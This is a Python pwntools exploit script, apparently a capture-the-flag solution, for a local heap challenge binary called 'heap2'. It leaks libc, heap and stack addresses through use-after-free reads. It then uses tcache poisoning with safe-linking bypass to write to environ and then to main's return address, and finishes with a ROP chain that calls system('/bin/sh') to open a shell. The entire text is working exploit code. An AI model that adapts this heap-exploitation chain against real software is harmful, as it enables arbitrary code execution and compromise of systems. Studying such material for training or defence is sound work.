from pwn import * 

def send_int(val):
    p.send(val)

def menu(choice):
    p.recvuntil(b">> ")
    send_int(choice)

def alloc(idx, size, data=b"\n"):
    menu(b"1")
    p.recvuntil(b"location: ")
    send_int(idx)
    p.recvuntil(b"size: ")
    send_int(size)
    p.recvuntil(b"data: ")
    p.send(data)

def free(idx):
    menu(b"2")
    p.recvuntil(b"location: ")
    send_int(idx)

def read_chunk(idx):
    menu(b"3")
    p.recvuntil(b"location: ")
    send_int(idx)
    data = p.recvuntil(b"\n", drop=True)
    return u64(data.ljust(8, b"\x00"))

def change(idx, data):
    menu(b"4")
    p.recvuntil(b"location: ")
    send_int(idx)
    p.recvuntil(b"data: ")
    p.send(data)

p = process('./heap2')

# 1. libc leak
alloc(b"13", b"2000")
alloc(b"14", b"100")
free(b"13")
main_arena = read_chunk(b"13")
libc_base  = main_arena - 0x1dcb20
log.info(f"LIBC: {hex(libc_base)}")

# stack leak
environ = libc_base + 0x1e3d58 

alloc(b'0', b'64')
alloc(b'1', b'64')
alloc(b'2',b'64')
free(b'0')
free(b'1')

key = read_chunk(b'0')  
log.info(f"heap base: {hex(key)}")

environ -= 0x18

log.info(f"environ: {hex(environ)}")
log.info(f"environ & 0xf: {environ & 0xf}")

change(b'1', p64(environ ^ key))

alloc(b'3',b'64')
alloc(b'4', b'64')

change(b'4', b'A' * 0x18)

menu(b'3')
p.recvuntil(b"location: ")
send_int(b'4')
data = p.recvuntil(b'\n', drop=True)
stack_leak = u64(data[0x18:0x18+6].ljust(8, b'\x00'))
log.info(f"stack: {hex(stack_leak)}")

# ROP

main_ret = stack_leak - 0x128
log.info(f"main_ret: {hex(main_ret)}")
log.info(f"is ok main_ret: {main_ret & 0xf}")

#pause()

alloc(b'5',b'96')
alloc(b'6',b'96')
alloc(b'7',b'96')

free(b'5')
free(b'6')

base2 = read_chunk(b'5')
log.info(f"heap base 2: {hex(base2)}")
change(b'6' , p64(main_ret ^ base2))

alloc(b'8',b'96')
alloc(b'9',b'96')

binsh = libc_base + 0x19de28
system = libc_base + 0x51c30
poprdi = libc_base + 0x2a265
ret = libc_base + 0x2848d

change(b'9' , b'A' * 8 + p64(ret)+p64(poprdi)+p64(binsh)+p64(system))

#ause()

p.interactive()